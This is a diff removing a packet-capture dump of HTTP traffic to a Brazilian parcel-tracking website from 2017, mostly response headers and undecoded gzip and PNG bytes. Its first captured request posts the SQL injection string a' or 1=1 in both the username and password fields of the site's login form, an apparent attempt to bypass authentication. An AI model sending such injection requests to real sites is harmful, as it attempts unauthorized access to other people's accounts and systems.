@@ -1,103 +1,0 @@
-   Payload (657 bytes):
-POST /login/ HTTP/1.1
-Host: www.muambator.com.br
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: pt-BR,en-US;q=0.7,en;q=0.3
-Accept-Encoding: gzip, deflate
-Referer: http://www.muambator.com.br/login/
-Cookie: __cfduid=d07b7b6814183383bda42fd5250c2fdb21486995842; csrftoken=XeoekUxQLseR9A7BKmcqgyJfftZAtn88
-Connection: keep-alive
-Upgrade-Insecure-Requests: 1
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 98
-
-csrfmiddlewaretoken=XeoekUxQLseR9A7BKmcqgyJfftZAtn88&username=a%27+or+1%3D1&password=a%27+or+1%3D1
-[END]
-   Payload (3736 bytes):
-şe$0¼(,š·»µÜµ»Ë¡7-òÍár³¹vÓòç l-Í•›–ÛÈSÄÈKõ%Âvs{’³Û åœå
-XÑ>ØM+Ï£J’=éˆ±Š‹m¬˜J}d‘éhÑ;%?ã”‹šùM¿6ûıÍ}ñp×ÚùÏ%©©,Tş¶u©EÓMz#Îf$©û
-[END]
-   Payload (1460 bytes):
-HTTP/1.1 200 OK
-Date: Mon, 13 Feb 2017 14:51:08 GMT
-Content-Type: text/html; charset=utf-8
-Transfer-Encoding: chunked
-Connection: keep-alive
-Vary: Cookie
-Set-Cookie: csrftoken=XeoekUxQLseR9A7BKmcqgyJfftZAtn88; expires=Mon, 12-Feb-2018 14:51:08 GMT; Max-Age=31449600; Path=/
-Server: cloudflare-nginx
-CF-RAY: 330918c2f1224b6f-GRU
-Content-Encoding: gzip
-
-12d4
-‹
-[END]
-   Payload (1460 bytes):
-HTTP/1.1 200 OK
-Date: Mon, 13 Feb 2017 14:51:08 GMT
-Content-Type: text/html; charset=utf-8
-Transfer-Encoding: chunked
-Connection: keep-alive
-Vary: Cookie
-Set-Cookie: csrftoken=XeoekUxQLseR9A7BKmcqgyJfftZAtn88; expires=Mon, 12-Feb-2018 14:51:08 GMT; Max-Age=31449600; Path=/
-Server: cloudflare-nginx
-CF-RAY: 330918c2f1224b6f-GRU
-Content-Encoding: gzip
-
-12d4
-‹
-[END]
-   Payload (456 bytes):
-GET /static/favicons/android-icon-192x192.png HTTP/1.1
-Host: www.muambator.com.br
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: pt-BR,en-US;q=0.7,en;q=0.3
-Accept-Encoding: gzip, deflate
-Cookie: __cfduid=d07b7b6814183383bda42fd5250c2fdb21486995842; csrftoken=XeoekUxQLseR9A7BKmcqgyJfftZAtn88
-DNT: 1
-Connection: keep-alive
-
-
-[END]
-   Payload (1460 bytes):
-HTTP/1.1 200 OK
-Date: Mon, 13 Feb 2017 14:51:09 GMT
-Content-Type: image/png
-Content-Length: 26200
-Connection: keep-alive
-Last-Modified: Thu, 26 Jan 2017 13:05:17 GMT
-ETag: "5889f40d-6658"
-Expires: Wed, 15 Mar 2017 14:51:09 GMT
-Cache-Control: public, max-age=2592000
-CF-Cache-Status: HIT
-Vary: Accept-Encoding
-Accept-Ranges: bytes
-Server: cloudflare-nginx
-CF-RAY: 330918c773bb4b6f-GRU
-
-‰PNG
-
-
-[END]
-   Payload (2920 bytes):
-&K«V7Z4šB€RVcYdî‚"YØúA¿¿–‘/Š5±Ö<‡ı3UÍOppÿ8J
-Â(¾¦GƒTH]GF1§Î­³°Tgu½IÅ(%QRvñÚ¯!úµÈn`NíûAkCk„€±ªqìcnvG‰DÉ¼:‚pU ÓJ®¢Ó	9}~ƒÓç×ÙL†NGI¤’YømçHtíõî?éK»‹RU$‘¤T;ÌL•¹çöyæg«„QŒÖ¯®Æ:Á¡
-[END]
-   Payload (1460 bytes):
-È¸v$hÑî„œŸ¼äàÃ®ÀqO>wÅ•z×½£¤RD¡O…|çı"oÿw²Y[K:¬öˆ*WÒ™S·PâøıoæóÿÂ R]g=où¥ŒqpÿZ_ÆĞ,%­NÀÓ/^È„(}TúN¥~§ÉÜá[ø¾ñ[åÇqŸ½íƒ’(
-ˆã˜×¿íı¸^‰§>ıÇ¸^a@äd
-[END]
-   Payload (1460 bytes):
-ıGÜ÷Ö¯¡ÓÈ	A¾IFó‹ll¶PJm;
-
-[END]
-   Payload (1460 bytes):
-°ö7ûÎv¿÷Ql»çí l½£sùWƒr<6WÎ³rúÜB7_=ñO“Pø¶©ÎÉ¬ğvSÆ$~
-[END]
-   Payload (1460 bytes):
-¸ïË¸ı]ßN{c	åxÛ3ùnp}¥ard„¥ÇÉÏ¤!h²4ôQ ¤àô™´ÚmÎïC)e«ç%”Æ¤8ÃÚz³ç—’Y¶k±Õ>gı‚N’B¬×ìavO…&æxå“¿Ësú+Çgìş”v¬nF46CfïgæîI¢NlM¹»C8jö¿a†bÕ¡V¨·âl–x°šBe‚'~÷#¬Ÿ·2A‡;ÇÁ%àæjZk”Wbù•Ç¹øÜ'qKU’Úµ&æÂÂ2/¾tŠf³…ë8YzŠúú÷Üüáf«Í™s,..ã‘¸NwvØ(DúÅW¨Ìföö7ú­Ë®‹¥”Îî+ĞqˆWdéÅÏñ™_ı!Ğ:›yì/‡è(A£sa%@·cnû†›˜¹w‚¸˜?»!@‡šÊÁ­‹>kÏ×ˆ¤d²ª‚gÅˆ— ±ÎâÓ0ïÛ(Nì#
-ıd†¸×á|5ép© uŒ[çé?ø?Yzş³6	Îè‘ü™Ò&Š4®c7ñƒ€µõO¹T¤ày¨7İ7öáSg.Ğh´PD
-KÌbaH=Ê¾ÃV2¬zŠ#¿§h·»1b5@s#>o©ÍÅ´½è^»£ç&G…x•IÖO=Í_ÿû¿OĞXÇñŠ™ÆéÅµ3Ï^h7#ªóEîşĞ­¹jo—Jr‹Ûêá2³D»£L;™ß—?Œ18^‘ÖúŸş‡^ÿ^¼òqèÛ¥ª;Åí(:l‡óK½v‡Ö1N±ÂÆÙçyâüLRZ?Gƒüi³q+’	J{u£Ñ¢Voàºêø¡èÃi”$ÑÍFŒë<Gv“A‡J€Mël\$l×9ü†÷ùíí³¾úàZÒ6&(ŒÏ²vú)şæßÿ}‚ÆN±2tc¸`q%d½¡[1w|Û1æ^?MÔº4íŸB:
-”çŠ›!«OnàGR-+âtv8Yl¹Äb…ÖÚ6Ï=Ïá‡ß‡*”‰ÃˆÕÉ¹&A¤[às¿òCl{§P‚l^<¤!• İÑtMµ¤zk)e·¶][¯¡ŞxoåÃY8ë4ø¦ÑÖLVUîİ(/§PbõÄç)Ïföö7¶ë×]tŒÁ76ÃâÓÅç~éŸĞÙ\Â)V@GÙĞt(°Ì¿ºqa% nÇÌ=8Í=ßu+±¯/‹ùS
